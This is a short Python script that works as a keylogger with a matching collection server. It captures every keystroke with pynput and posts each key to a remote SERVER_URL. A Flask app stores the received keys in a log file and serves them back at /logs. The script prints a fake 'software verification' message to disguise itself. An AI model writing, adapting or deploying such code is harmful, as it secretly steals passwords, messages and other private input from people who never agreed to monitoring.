
from httpcore import URL
from pynput import keyboard
import requests
import os 
from dotenv import load_dotenv
from pathlib import Path
from flask import Flask, request


ROOT_DIR = Path(__file__).parent

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(BASE_DIR, "/var/data/log.txt")

load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
SERVER_URL = os.environ['SERVER_URL']

USE_PYNPUT = os.environ.get("USE_PYNPUT") == "1"

if USE_PYNPUT:
    from pynput import keyboard

# Fichier local pour enregistrer mes codes
print("Verification logiciel pro 2026 ✅", flush=True)


requests.post(SERVER_URL, json={"content": "test"})
# Fonction pour enregistrer les frappes dans un fichier
def on_press(key):

    payload = {"content": str(key)}
    try:
      requests.post(SERVER_URL, json={"content": str(key)}, timeout=5)

    except Exception as e:
        print(f"Erreur d'enregistrement: {e}")


# Démarre l'écoute des frappes
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

app = Flask(__name__)
LOG_FILE = "/var/data/log.txt"

@app.route("/", methods=["GET"])
def home():
    return "API OK", 200

@app.route("/log", methods=["POST"])
def log():
    data = request.get_json(silent=True) or {}
    key = data.get("content")

    if not key:
        return {"error": "contenu manquant"}, 400

    os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(key + "\n")

    return {"ok": True}, 200

@app.route("/logs", methods=["GET"])
def read_logs():
    if not os.path.exists(LOG_FILE):
        return {"error": "log.txt introuvable", "path": LOG_FILE}, 404
    with open(LOG_FILE, "r", encoding="utf-8") as f:
        return "<pre>" + f.read() + "</pre>", 200
